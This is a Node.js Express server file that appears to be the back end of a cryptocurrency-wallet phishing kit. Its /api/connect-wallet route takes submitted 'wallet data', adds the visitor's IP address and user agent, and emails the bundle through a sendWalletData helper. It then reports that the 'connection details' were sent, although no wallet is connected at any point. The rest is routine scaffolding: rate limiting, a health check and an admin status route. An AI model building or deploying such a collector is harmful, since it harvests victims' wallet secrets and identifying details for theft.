// Main server file
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import rateLimit from 'express-rate-limit';
import { sendWalletData } from './emailService.js';
import config from './config.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Configure CORS
const corsOptions = {
  origin: config.production ? process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:8080'] : '*',
  methods: 'GET, POST, OPTIONS',
  allowedHeaders: 'Content-Type, Authorization',
  credentials: true,
  optionsSuccessStatus: 204
};

// Rate limiter middleware
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: { success: false, message: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false
});

// Middleware
app.use(cors(corsOptions));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Apply rate limiting to API routes
app.use('/api', apiLimiter);

// Routes
app.post('/api/connect-wallet', async (req, res) => {
  try {
    const walletData = req.body;
    
    // Get the client IP address
    const ipAddress = req.headers['x-forwarded-for'] || 
                      req.socket.remoteAddress || 
                      'Unknown';
    
    console.log(`Received wallet data from IP: ${ipAddress}`);
    
    if (!walletData.walletType) {
      return res.status(400).json({ success: false, message: 'Wallet type is required' });
    }
    
    // Add IP address and timestamp to wallet data
    const dataWithIp = {
      ...walletData,
      ipAddress,
      timestamp: new Date().toISOString(),
      userAgent: req.headers['user-agent']
    };
    
    // Send the email with wallet data
    await sendWalletData(dataWithIp);
    
    // Track successful API request
    trackApiSuccess();
    
    // Return success response
    res.status(200).json({
      success: true,
      message: 'Wallet connection details sent successfully',
      requestId: `req_${Date.now().toString(36)}_${Math.random().toString(36).substring(2, 7)}`
    });
  } catch (error) {
    // Track failed API request
    trackApiFailure(error);
    
    console.error('Error processing wallet connection:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to process wallet connection',
      error: config.production ? undefined : error.message
    });
  }
});

// Import monitoring utilities
import { 
  getServerStats, 
  getRequestStats, 
  trackRequest,
  trackApiSuccess,
  trackApiFailure
} from './utils/monitoring.js';

// Track all requests
app.use((req, res, next) => {
  trackRequest(req, req.path.startsWith('/api'));
  next();
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'Server is running' });
});

// Server status endpoint (protected)
app.get('/admin/status', (req, res) => {
  // Basic protection - in production you'd want proper authentication
  const apiKey = req.query.apiKey || req.headers['x-api-key'];
  
  if (config.production && (!apiKey || apiKey !== process.env.ADMIN_API_KEY)) {
    return res.status(401).json({ 
      status: 'Unauthorized',
      message: 'Valid API key required'
    });
  }
  
  res.status(200).json({
    status: 'Server is running',
    system: getServerStats(),
    requests: getRequestStats(),
    config: {
      emailConfigured: !!config.emailUser && !!config.emailPass,
      environment: config.production ? 'production' : 'development'
    }
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({
    success: false,
    message: 'Internal server error',
    error: config.production ? null : err.message
  });
});

// Handle 404 errors
app.use((req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ 
      success: false, 
      message: 'API endpoint not found' 
    });
  }
  
  // For non-API routes, serve the test page
  if (!req.path.includes('.')) {
    res.sendFile(path.join(__dirname, 'public', 'test.html'));
  } else {
    res.status(404).send('Not found');
  }
});

// Start server
const PORT = config.port;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`- API: http://localhost:${PORT}/api/connect-wallet`);
  console.log(`- Test page: http://localhost:${PORT}/test.html`);
});
